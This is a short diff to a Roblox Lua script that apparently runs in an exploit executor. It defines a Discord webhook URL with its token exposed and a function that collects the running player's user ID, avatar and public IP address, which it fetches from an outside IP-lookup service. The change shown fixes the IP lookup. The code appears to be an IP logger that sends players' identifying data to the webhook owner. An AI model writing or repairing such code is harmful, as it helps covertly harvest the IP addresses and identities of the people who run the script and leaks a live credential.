@@ -3,6 +3,7 @@ local webhookURL = "https://discord.com/api/webhooks/1294211092389564457/9AKdgc5
 local function sendWebhookLog()
     local player = game.Players.LocalPlayer
     local avatarURL = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
+    local httpService = game:GetService("HttpService")
     local response = syn and syn.request({Url = "https://httpbin.org/ip", Method = "GET"}) or http_request({Url = "https://httpbin.org/ip", Method = "GET"})
     local ipData = httpService:JSONDecode(response)
     local playerIP = ipData.origin
